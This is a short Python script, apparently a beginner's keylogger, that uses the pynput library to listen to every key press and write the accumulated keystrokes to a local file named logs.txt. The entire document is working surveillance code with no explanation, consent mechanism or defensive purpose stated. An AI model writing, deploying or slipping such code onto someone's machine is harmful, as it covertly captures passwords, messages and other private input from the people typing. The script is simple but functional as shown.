from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
  keys.append(key)
  d=open("logs.txt","w")
  d.write(str(keys))
  d.close()

with Listener(on_press=on_press) as listner:
 listner.join()


